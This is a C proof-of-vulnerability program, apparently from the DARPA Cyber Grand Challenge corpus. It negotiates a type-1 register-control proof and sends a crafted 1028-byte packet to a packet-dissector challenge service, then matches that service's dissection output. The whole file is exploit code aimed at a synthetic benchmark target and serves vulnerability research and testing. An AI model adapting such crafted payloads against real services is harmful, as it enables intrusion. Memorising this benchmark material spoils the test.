#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x38\x65\xd0\xd8"
         "\x0b\x3e\x76\x33\xd9\xa7\xf4\xa2\xfc\x0d\xc6\x8b\x45\x12\xf1\x6c"
         "\x0f\x00\x00\x00\xab\xa1\x82\x21\xb4\x63\x8b\x99\x02\x29\xad\xba"
         "\x37\x00\xd4\x76\xe9\x0e\x37\x37\xb6\x5d\xb4\x0a\x46\x8c\x67\x9c"
         "\xb9\x3d\x6d\xea\xe2\xe6\x37\x00\x26\x47\x4b\xec\x06\xde\x33\xa5"
         "\x7d\xad\x80\xef\x54\x81\xc7\x1f\xaa\xbe\x36\x8c\xc2\xa5\x1d\xd9"
         "\xc9\x1f\xad\xb9\xc8\x19\x7b\x68\xb8\xa6\x5b\x9c\xfa\x9f\x7d\x04"
         "\xaf\x80\x6d\x1f\xcc\x16\x6e\x88\x50\x0b\x3a\x7d\x68\x3d\x0a\x95"
         "\xb0\x76\xa1\xea\x14\x5a\x25\x9f\xa7\xc5\xfe\x63\xec\x1f\x12\xdd"
         "\x00\x23\xd5\xaa\xc9\xe4\x7d\x80\xdf\x4d\x6e\xf5\xc2\xaa\x22\x25"
         "\xd6\xfe\xdd\x9c\x27\xe6\xf3\xef\x3e\xa0\x40\xeb\x55\xa3\x0d\x49"
         "\xc6\x21\x52\xbc\x9e\x7c\x82\x67\x34\x8f\x77\x0a\x7d\x30\xae\x33"
         "\x24\xad\x54\xe0\x03\x0b\x62\x22\x1e\x95\x5c\x3c\x5f\x8b\x16\xa3"
         "\x6f\xff\x79\x26\x0f\x64\xe0\xb4\xd5\xca\x82\xdd\x48\x30\x94\x90"
         "\x17\x35\x75\xd2\xb9\xb4\x45\x48\x3c\x87\x20\xff\x3f\xcc\x6c\x98"
         "\xf7\x97\x71\x41\x58\x60\x96\xf1\x75\xa4\x79\x13\x10\x12\x6a\x3a"
         "\xeb\x1d\x37\x54\x67\xcb\x1c\x5d\x89\x67\x5f\x3e\x52\x35\xd0\xfd"
         "\xb6\x98\x26\xf5\xe5\xd5\x2b\xb7\x01\x70\x2f\x1f\x06\xef\xec\xbc"
         "\xb0\x36\x41\x01\x25\x65\xfd\x99\xaf\xf7\x53\x30\xa8\x36\xcb\xf4"
         "\xc3\xa1\xf5\x3d\xb9\xbe\xe9\x88\xc6\x6f\xf2\x6a\xcd\x78\x18\x2e"
         "\x82\xcc\x8a\xd9\xd6\x16\xfe\xb6\x72\x42\x43\x15\xbf\x5c\x2d\xc4"
         "\x45\x4c\xbc\xe0\x97\x10\x6c\xc6\x17\xbe\xd4\xe3\x37\x00\xf2\x41"
         "\xc6\xb8\xa7\x86\x03\x18\xea\xd4\x06\x88\x92\x89\x4b\xfe\x77\x1e"
         "\x0d\xbb\x60\x01\x69\x35\xe3\xbf\xb6\x8d\xb5\x37\x9f\xb1\xde\x0f"
         "\x3d\xd2\x2a\x4b\xc6\x07\xfd\xf1\xd9\x07\xc8\xf7\x12\x6d\x64\x4f"
         "\x78\xcb\xd8\x02\x75\xbb\xa7\x7b\x98\xc3\x83\xdb\x7e\xee\x0d\x77"
         "\xe3\xb4\x14\x8c\x96\xc7\xae\x0a\xb4\x36\xa7\xbd\x13\xfd\x04\x28"
         "\xe5\x11\x9c\x90\x54\xf8\xeb\x81\xa1\xca\x39\x33\x93\xf5\x6f\x20"
         "\x1d\x2d\xaa\xef\xe6\xd6\xe0\x90\x0f\x48\xfd\xb8\xbc\x96\x73\xb9"
         "\x69\x14\x69\xef\x67\xc5\x4e\x94\xf9\xed\xf1\x05\x67\x38\x0f\x65"
         "\x43\xf8\x71\x05\x31\x8d\x7c\x73\x2b\x9c\xb5\x9e\xdf\x37\x2f\xd7"
         "\x49\x80\x63\xb0\xb2\x3b\xed\x55\xca\x42\x9f\xee\xb9\x1b\x31\x63"
         "\x96\x4d\xf6\x5f\xe7\x37\xfe\x58\x04\x1a\xec\x3d\xb2\x0d\x74\x92"
         "\x51\x1a\xd4\x73\x8a\x3b\x63\xca\xc4\x82\x7f\x86\x43\x3d\x15\x76"
         "\x8b\x9b\x07\xbb\x63\x4b\x0c\x10\x8a\xa2\x1f\x6b\x69\x6e\x04\x99"
         "\x2e\xe2\xdd\x56\xc0\x8a\x95\xb0\xc4\x53\x3f\xf0\xce\xa0\xa0\x50"
         "\xf4\xee\xef\x79\x3c\xc2\xdf\xd2\x9c\x48\xf6\x31\xe9\xfa\x8d\x02"
         "\xfd\xa4\xdb\xae\x7e\x57\xc1\xb9\x3a\x2a\x9a\xa2\xb2\x6d\xe5\x95"
         "\xf6\xe6\x66\xe4\x6d\xeb\x2e\x74\x4a\x35\xae\x36\x6a\x7d\xcb\x8c"
         "\xc6\x19\xd0\x6e\x17\xde\x66\x01\x8b\xb1\x37\x32\x0c\xc1\x8f\x70"
         "\x13\xbf\x6a\x7f\xcf\x46\x47\x1e\x7b\x36\xc0\x0d\x92\x9d\xb4\xf9"
         "\xbc\x52\xc0\xa3\x35\xfb\xc5\x97\x8f\x40\x06\x75\xb5\x82\x14\x63"
         "\x02\x1f\x0e\x1d\xc0\x27\x58\x0f\xb5\xd9\xe7\x7c\x00\x63\xfc\xf8"
         "\xe4\x81\x0a\x7f\xb7\xfb\x56\x63\x8a\x96\x9a\x05\x8e\x36\xbb\x85"
         "\xca\xad\x6a\x70\xdd\xb6\xfb\xd0\xfc\x6c\x05\xa5\x48\xd2\x2f\x5c"
         "\xe8\xf3\x9a\x1e\x19\x0f\x69\xe5\x3b\xa3\x6f\x40\xd1\x1a\x2b\x35"
         "\xc6\xb5\x55\xef\x91\x6d\x9d\x71\x1c\x94\x27\xfa\x94\x30\xe0\x6f"
         "\x53\xfd\xbf\x7a\xc2\xec\x93\x60\x88\xaf\xcf\x5e\x07\x49\xdd\x2f"
         "\xe2\xc1\xcd\x3a\x83\x82\x0b\x8f\x53\xa6\xa3\x77\x59\xb2\x64\x23"
         "\x68\xce\x08\x55\xf6\x0c\x88\x88\x89\xbb\xf6\x8e\x10\xe6\xba\x54"
         "\x38\xd3\x0b\x06\x5d\x5c\x49\x45\xd0\xa4\x44\x29\xac\xe1\x4f\x0f"
         "\x03\xa5\xfb\xe3\x52\xdc\x98\xa5\x56\xeb\x10\x45\xb2\xb2\x4a\xf5"
         "\xd4\x7e\x40\x36\xb2\x17\x5f\xde\xa0\x7a\x5d\xcd\x8b\xb6\x23\x1f"
         "\x67\x11\xf2\x38\x80\x39\x18\xf1\x47\x8b\xb0\xfa\x8e\xbb\xaf\x4b"
         "\xa0\xc3\xb8\x97\x61\xd1\x26\xec\xf3\x06\xf4\x6c\x58\xc5\x34\x5b"
         "\xef\x47\x72\x6c\x1c\x5a\xcb\x41\xb4\x1e\x4c\xd1\xdb\x99\x76\x86"
         "\xb5\xfd\xda\xbd\x85\x26\x68\x58\x44\xba\xb7\x8f\x41\x9c\xfa\xa3"
         "\x95\xdf\x1f\x17\xa6\x5d\xe9\x37\x00\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===byworkplastid
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x62\x79\x77\x6f\x72\x6b\x70\x6c\x61\x73\x74"
         "\x69\x64";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
